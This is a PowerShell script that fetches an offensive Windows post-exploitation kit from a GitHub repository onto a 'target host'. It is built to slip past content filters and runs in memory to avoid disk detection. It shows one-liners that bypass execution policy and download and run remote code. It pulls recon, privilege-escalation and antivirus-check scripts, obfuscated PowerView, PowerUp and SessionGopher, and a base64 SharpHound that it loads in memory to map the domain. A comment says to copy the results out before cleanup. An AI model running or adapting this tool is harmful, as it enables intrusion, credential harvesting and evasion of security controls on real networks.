# Get-Kit.ps1 - text-only kit fetcher (for hosts where zip/exe downloads are blocked)
# Every file in this repo is plain text; pull them one by one from raw.githubusercontent
# (text/plain responses, typically pass content filters that block exe/zip).
#
# Usage (on the target host):
#   powershell -ep bypass -c "iex (iwr <raw>/ps1/Get-Kit.ps1)"        # fetch whole kit to %TEMP%\day2-kit
#   powershell -ep bypass -c "iex (iwr <raw>/ps1/Get-Kit.ps1); Invoke-BloodHoundFromRepo -Domain <d>"
#
param(
    [string]$RawBase = 'https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main',
    [string]$OutDir  = (Join-Path $env:TEMP 'day2-kit')
)

$files = @(
    'README-Day2.md',
    'manifest.sha256',
    'bat/00-context.bat', 'bat/01-sysinfo.bat', 'bat/02-net-recon.bat',
    'bat/03-domain.bat', 'bat/04-services.bat', 'bat/05-privesc.bat',
    'bat/06-av-check.bat', 'bat/07-schtasks.bat', 'bat/99-run-all.bat',
    'wsh/enum-system.vbs', 'wsh/enum-network.js', 'wsh/run-all.wsf',
    'ps1/Get-LocalRecon.ps1', 'ps1/Load-Assembly.ps1', 'ps1/Invoke-Suite.ps1',
    'ps1/Get-Kit.ps1', 'ps1/InMem-Asm.ps1',
    'tools-obf/PowerUp.ps1', 'tools-obf/PowerView.ps1', 'tools-obf/jaws-enum.ps1',
    'tools-obf/SessionGopher.ps1', 'tools-obf/PrivescCheck.ps1',
    'tools-obf/SharpHound.exe.b64'
)

$wc = New-Object Net.WebClient
foreach ($f in $files) {
    $dest = Join-Path $OutDir ($f -replace '/', '\')
    $dir = Split-Path $dest -Parent
    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    try {
        $wc.DownloadFile("$RawBase/$f", $dest)
        Write-Host "[+] $f"
    } catch {
        Write-Host "[-] $f : $($_.Exception.Message)"
    }
}
Write-Host "[+] kit -> $OutDir"

# In-memory SharpHound: decode b64 text -> assembly in RAM, never touch disk
function Invoke-BloodHoundFromRepo {
    param([string]$Domain = $env:USERDNSDOMAIN, [string]$ZipOut = (Join-Path $env:TEMP 'bh.zip'))
    . (Join-Path $OutDir 'ps1\InMem-Asm.ps1')
    Invoke-AsmFromB64 -B64Path (Join-Path $OutDir 'tools-obf\SharpHound.exe.b64') `
        -AsmArgs @('-c','All','-d',$Domain,'--outputdirectory',$env:TEMP,'--zipfilename',(Split-Path $ZipOut -Leaf))
    Write-Host "[+] bloodhound zip -> $ZipOut (copy out via hotspot/upload before cleanup)"
}
